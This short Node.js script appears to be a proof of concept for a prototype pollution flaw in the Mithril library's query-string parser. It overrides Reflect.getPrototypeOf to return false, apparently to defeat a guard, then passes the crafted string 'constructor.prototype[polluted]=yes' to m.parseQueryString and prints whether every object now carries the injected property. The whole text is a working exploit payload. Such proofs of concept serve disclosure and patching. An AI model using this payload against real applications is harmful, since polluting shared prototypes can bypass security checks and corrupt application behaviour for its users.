Reflect.getPrototypeOf = () => false;
require('mithril/test-utils/browserMock')(global);
const m = require('mithril');
obj = {};
console.log({}.polluted);
m.parseQueryString('constructor.prototype%5Bpolluted%5D=yes');
console.log({}.polluted);